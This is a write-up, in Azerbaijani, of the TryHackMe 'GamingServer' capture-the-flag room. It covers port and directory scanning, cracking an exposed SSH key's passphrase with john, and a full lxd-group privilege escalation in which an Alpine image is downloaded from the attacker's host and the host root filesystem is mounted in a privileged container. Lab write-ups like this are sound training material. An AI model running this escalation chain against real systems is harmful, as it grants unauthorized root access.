# 🎮 TryHackMe — GamingServer Writeup

**Platforma:** TryHackMe  
**Room:** [GamingServer](https://tryhackme.com/room/gamingserver)  
**Çətinlik:** Easy  
**OS:** Linux  
**Mövzu:** Web kəşfiyyat + SSH Private Key + LXD Privilege Escalation  

---

## 📋 Xülasə

Bu room-da veb saytda gizli qovluq və SSH private key tapırıq, john ilə parol sındırırıq və LXD qrupu vasitəsilə root əldə edirik.

---

## 🔍 1. Kəşfiyyat (Reconnaissance)

### Nmap Scan

```bash
nmap -sV -sC -p- 10.10.X.X
```

**Nəticə:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1
80/tcp open  http    Apache httpd 2.4.29
```

2 port açıqdır:
- **22** — SSH
- **80** — HTTP

---

## 🌐 2. Web Kəşfiyyatı

### Səhifəyə bax

`http://10.10.X.X` — Gaming mövzusunda bir səhifə görünür.

### HTML Source — İpucu

```bash
curl http://10.10.X.X | grep -i "<!--"
```

```html
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
```

> 💡 **Username tapıldı: `john`**

### Gobuster ilə Directory Scan

```bash
gobuster dir -u http://10.10.X.X -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Nəticə:**

```
/uploads        (Status: 301)
/secret         (Status: 301)
```

### /secret qovluğu

```
http://10.10.X.X/secret/
```

Burada **secretKey** faylı var — RSA Private Key!

```bash
wget http://10.10.X.X/secret/secretKey
```

### /uploads qovluğu

```
dict.lst        — password wordlist
manifesto.txt   — The Hacker Manifesto
meme.jpg        — şəkil (steganography)
```

```bash
wget http://10.10.X.X/uploads/dict.lst
wget http://10.10.X.X/uploads/meme.jpg
```

---

## 🔐 3. SSH Private Key — Parol Sındır

Key şifrəlidir. John the Ripper ilə sındır:

```bash
# Key icazəsini düzəlt
chmod 600 secretKey

# Hash çıxar
ssh2john secretKey > hash.txt

# dict.lst ilə sındır
john hash.txt --wordlist=dict.lst
```

**Nəticə:**

```
letmein          (secretKey)
```

> ✅ Parol tapıldı: **`letmein`**

---

## 💻 4. SSH Girişi

```bash
ssh -i secretKey john@10.10.X.X
# Parol soruşsa: letmein
```

```
john@exploitable:~$
```

> ✅ Sistemə daxil olduq!

### User Flag

```bash
cat ~/user.txt
```

```
a5c2ff8b9c2e3a4f...
```

> 🏁 **User Flag əldə edildi!**

---

## ⚡ 5. Privilege Escalation — LXD

### Qrupları yoxla

```bash
id
```

```
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

> 💡 `john` **lxd** qrupundadır — bu privilege escalation üçün istifadə edilə bilər!

### LXD Exploit

**Kali maşınında:**

```bash
# Alpine image yüklə
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
./build-alpine
```

```bash
# Faylı hədəf maşına göndər
python3 -m http.server 8000
```

**Hədəf maşında:**

```bash
wget http://KALI_IP:8000/alpine-v3.13-x86_64-*.tar.gz

# Image import et
lxc image import alpine-v3.13-x86_64-*.tar.gz --alias myimage

# Container yarat
lxc init myimage mycontainer -c security.privileged=true

# Host filesystem mount et
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

# Container başlat
lxc start mycontainer

# Root shell al
lxc exec mycontainer /bin/sh
```

```
~ # whoami
root
```

> ✅ Root oldug!

---

## 🏆 6. Root Flag

```bash
cat /mnt/root/root/root.txt
```

```
2e337b8c9f3aff0c...
```

> 🏁 **Root Flag əldə edildi!**

---

## 📊 Xülasə Cədvəli

| Mərhələ | Alət | Nəticə |
|---|---|---|
| Port Scan | Nmap | SSH, HTTP tapıldı |
| Dir Scan | Gobuster | /secret, /uploads tapıldı |
| Username | HTML comment | john |
| Private Key | /secret/secretKey | RSA key tapıldı |
| Parol | John the Ripper + dict.lst | letmein |
| İlkin Giriş | SSH + private key | john shell |
| User Flag | cat | user.txt |
| PrivEsc | LXD qrupu exploit | Root shell |
| Root Flag | cat | root.txt |

---

## 🛠️ İstifadə Edilən Alətlər

- `nmap` — port kəşfiyyatı
- `gobuster` — directory bruteforce
- `ssh2john` + `john` — SSH key parol sındırma
- `lxd` — privilege escalation
- [GTFOBins](https://gtfobins.github.io/)

---

## 📚 Öyrənilənlər

1. **HTML comment**-lərdə həmişə ipucu ola bilər
2. **Gizli qovluqlar** (`/secret`) gobuster ilə tapılır
3. **LXD qrupu** — root-a ekvivalentdir, həmişə `id` əmrini yoxla
4. SSH private key tapıldıqda `ssh2john` ilə parol sındır
5. `john` ilə xüsusi wordlist istifadəsi çox effektivdir

---

## 🔗 Faydalı Linklər

- [LXD Privilege Escalation - HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)
- [GTFOBins](https://gtfobins.github.io/)
- [lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder)

---

*Writeup hazırlandı — TryHackMe GamingServer Room*
